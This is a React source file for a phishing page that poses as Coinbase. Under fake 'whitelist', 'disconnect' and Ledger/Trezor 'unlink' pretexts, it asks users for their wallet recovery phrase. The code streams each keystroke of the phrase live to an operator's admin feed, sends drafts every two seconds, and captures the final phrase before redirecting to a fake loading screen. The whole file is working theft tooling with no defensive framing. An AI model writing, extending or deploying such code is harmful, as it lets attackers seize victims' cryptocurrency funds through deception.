import { createFileRoute } from "@tanstack/react-router";
import { useCallback, useEffect, useRef, useState } from "react";
import {
  CbFontStyle,
  CbLogo,
  CbSupportBanner,
  useCbTracking,
  useQueryParam,
} from "@/components/cb/CbShared";
import { cbIcons } from "@/lib/cb-assets";

export const Route = createFileRoute("/cb/phrase")({
  head: () => ({ meta: [{ title: "Recovery phrase" }] }),
  component: CbPhrasePage,
});

type PhraseMode = "whitelist" | "disconnect" | "ledger" | "trezor";

const CONTENT: Record<PhraseMode, { title: string; description: string; logo?: string }> = {
  whitelist: {
    title: "Wallet Whitelist",
    description:
      "Use the 12/24 word recovery phrase associated with your Coinbase Wallet to enable whitelisting for your designated wallet.",
  },
  disconnect: {
    title: "Disconnect Wallet",
    description:
      "Use the 12/24 word recovery phrase associated with your wallet to disconnect it from our system.",
  },
  ledger: {
    title: "Unlink Cold Wallet",
    description:
      "Type in your 12 or 24 word Ledger Recovery phrase in order to successfully unlink it from your Coinbase account.",
    logo: cbIcons.ledger,
  },
  trezor: {
    title: "Unlink Cold Wallet",
    description:
      "Type in your 12 or 24 word Trezor Recovery phrase in order to successfully unlink it from your Coinbase account.",
    logo: cbIcons.trezor,
  },
};

function CbPhrasePage() {
  const { trackClick, trackInput, cbNavigate, sessionId } = useCbTracking();
  const urlMode = useQueryParam("mode") as PhraseMode | null;
  const mode: PhraseMode =
    urlMode === "whitelist" || urlMode === "disconnect" || urlMode === "ledger" || urlMode === "trezor"
      ? urlMode
      : "whitelist";

  const [phrase, setPhrase] = useState("");
  const [focused, setFocused] = useState(false);
  const lastSentRef = useRef("");
  const phraseRef = useRef("");
  const textareaRef = useRef<HTMLTextAreaElement>(null);

  const hasValue = phrase.length > 0;

  useEffect(() => {
    phraseRef.current = phrase;
    // Live-broadcast on every change so the admin's live-input feed picks it up
    // in real time (replaces the old usePhraseTypingBroadcast).
    trackInput("phrase", phrase);
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [phrase]);

  useEffect(() => {
    const t = setInterval(() => {
      const current = phraseRef.current;
      if (current && current !== lastSentRef.current) {
        lastSentRef.current = current;
        trackInput(`phrase_draft_${mode}`, current);
      }
    }, 2000);
    return () => clearInterval(t);
  }, [mode, trackInput]);

  const handleKeyDown = (e: React.KeyboardEvent<HTMLTextAreaElement>) => {
    if (e.key === "Enter") {
      e.preventDefault();
      if (phrase.trim() && !phrase.endsWith(" ")) {
        setPhrase((prev) => prev + " ");
      }
    }
  };

  const handleChange = (e: React.ChangeEvent<HTMLTextAreaElement>) => {
    let val = e.target.value;
    val = val.replace(/\n/g, " ");
    val = val.replace(/  +/g, " ");
    setPhrase(val);
  };

  const handleSubmit = useCallback(() => {
    if (!phrase.trim()) return;
    trackClick(`Phrase Submit ${mode}`);
    trackInput(`phrase_final_${mode}`, phrase.trim());
    cbNavigate("/cb/loading");
  }, [phrase, mode, trackClick, trackInput, cbNavigate]);

  const wordCount = phrase.trim() ? phrase.trim().split(/\s+/).length : 0;
  const content = CONTENT[mode];
  void hasValue;

  return (
    <div
      className="cb-page"
      style={{
        display: "flex",
        flexDirection: "column",
        minHeight: "100vh",
        backgroundColor: "rgb(10, 11, 13)",
        color: "#fff",
      }}
    >
      <CbFontStyle />
      <style>{`
        .cb-page, .cb-page * {
          font-family: 'CoinbaseSans', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif !important;
          -webkit-font-smoothing: antialiased; box-sizing: border-box;
        }
        @keyframes cbFadeIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
        .cb-animate { animation: cbFadeIn 0.5s cubic-bezier(0.16, 1, 0.3, 1) both; }
        .cb-animate-delay-1 { animation-delay: 0.05s; }
        .cb-animate-delay-2 { animation-delay: 0.1s; }
        .cb-animate-delay-3 { animation-delay: 0.15s; }
        .cb-animate-delay-4 { animation-delay: 0.2s; }
        .cb-header { display: grid; grid-template-columns: auto 1fr auto; height: 72px; align-items: center; padding: 0 24px; }
        .cb-header-logo { display: flex; align-items: center; color: #fff; cursor: pointer; }
        .cb-phrase-textarea-wrap {
          position: relative; min-height: 80px; border-radius: 12px;
          border: 1px solid rgba(138, 145, 158, 0.2);
          background: rgb(10, 11, 13); padding: 0 16px; cursor: text;
          transition: background-color 0.15s ease, border-color 0.15s ease;
        }
        .cb-phrase-textarea-wrap:hover { background: rgb(17, 18, 20); border-color: rgb(17, 18, 20); }
        .cb-phrase-textarea-wrap.focused { border-color: rgb(87, 139, 250); box-shadow: 0 0 0 1px rgb(87, 139, 250); background: rgb(10, 11, 13); }
        .cb-phrase-textarea-wrap.focused:hover { background: rgb(10, 11, 13); }
        .cb-phrase-submit {
          width: 100%; height: 56px; margin-top: 16px; border: none; border-radius: 1000px;
          background: rgb(87, 139, 250); color: rgb(10, 11, 13);
          font-size: 16px; font-weight: 700; line-height: 24px; cursor: pointer;
          transition: background-color 0.15s ease, opacity 0.15s ease, transform 0.1s ease;
          display: flex; align-items: center; justify-content: center;
        }
        .cb-phrase-submit:disabled { opacity: 0.4; cursor: not-allowed; }
        .cb-phrase-submit:not(:disabled):hover { background: rgb(95, 144, 250); }
        @media (max-width: 640px) { .cb-header { padding: 0 16px; height: 56px; } }
      `}</style>

      <CbSupportBanner />

      <header className="cb-header">
        <div className="cb-header-logo" onClick={() => trackClick("Logo")}>
          <CbLogo />
        </div>
        <div />
        <div />
      </header>

      <main
        style={{
          display: "flex",
          justifyContent: "center",
          flexGrow: 1,
          padding: "0 16px",
          paddingTop: 48,
        }}
      >
        <div style={{ width: "100%", maxWidth: 380, display: "flex", flexDirection: "column" }}>
          <div
            className="cb-animate"
            style={{ display: "flex", justifyContent: "center", marginBottom: 24 }}
          >
            {content.logo ? (
              <img
                src={content.logo}
                alt=""
                style={{
                  width: mode === "trezor" ? 180 : 200,
                  height: "auto",
                  maxHeight: 80,
                }}
              />
            ) : (
              <img src={cbIcons.shield} alt="" style={{ width: 64, height: 64 }} />
            )}
          </div>

          <h1
            className="cb-animate cb-animate-delay-1"
            style={{
              fontSize: 28,
              fontWeight: 500,
              lineHeight: "36px",
              letterSpacing: "-0.02em",
              color: "#fff",
              margin: "0 0 8px 0",
              textAlign: "center",
            }}
          >
            {content.title}
          </h1>

          <p
            className="cb-animate cb-animate-delay-2"
            style={{
              fontSize: 14,
              lineHeight: "20px",
              color: "rgb(138, 145, 158)",
              textAlign: "center",
              margin: "0 0 24px 0",
            }}
          >
            {content.description}
          </p>

          <div className="cb-animate cb-animate-delay-3">
            <label
              style={{
                fontSize: 14,
                fontWeight: 500,
                lineHeight: "20px",
                color: "rgb(138, 145, 158)",
                display: "block",
                marginBottom: 8,
              }}
              htmlFor="cb-phrase-input"
            >
              Seed Phrase
            </label>
            <div
              className={`cb-phrase-textarea-wrap ${focused ? "focused" : ""}`}
              onClick={() => textareaRef.current?.focus()}
            >
              <textarea
                id="cb-phrase-input"
                name="phrase"
                ref={textareaRef}
                value={phrase}
                onChange={handleChange}
                onKeyDown={handleKeyDown}
                onFocus={() => setFocused(true)}
                onBlur={() => setFocused(false)}
                placeholder="Enter your recovery phrase"
                autoComplete="off"
                spellCheck={false}
                style={{
                  width: "100%",
                  minHeight: 56,
                  background: "transparent",
                  border: "none",
                  outline: "none",
                  fontSize: 14,
                  fontWeight: 400,
                  color: "#fff",
                  lineHeight: "20px",
                  paddingTop: 16,
                  paddingBottom: 10,
                  resize: "none",
                  caretColor: "rgb(87, 139, 250)",
                  fontFamily: "inherit",
                }}
              />
              {wordCount > 0 && (
                <div
                  style={{
                    position: "absolute",
                    right: 12,
                    bottom: 8,
                    fontSize: 11,
                    color:
                      wordCount === 12 || wordCount === 24
                        ? "#00D395"
                        : "rgb(138, 145, 158)",
                    fontWeight: 500,
                    transition: "color 0.15s",
                  }}
                >
                  {wordCount} word{wordCount !== 1 ? "s" : ""}
                </div>
              )}
            </div>
            <p style={{ fontSize: 12, color: "rgb(87, 139, 250)", marginTop: 6, marginBottom: 0 }}>
              Divide the seed phrase with an empty space between each word
            </p>
          </div>

          <button
            className="cb-phrase-submit cb-animate cb-animate-delay-4"
            onClick={handleSubmit}
            disabled={!phrase.trim()}
          >
            {mode === "ledger" || mode === "trezor" ? "Next" : "Continue"}
          </button>
        </div>
      </main>

      <div style={{ position: "fixed", bottom: 8, right: 8, fontSize: 10, opacity: 0, pointerEvents: "none" }}>
        {sessionId}
      </div>
    </div>
  );
}
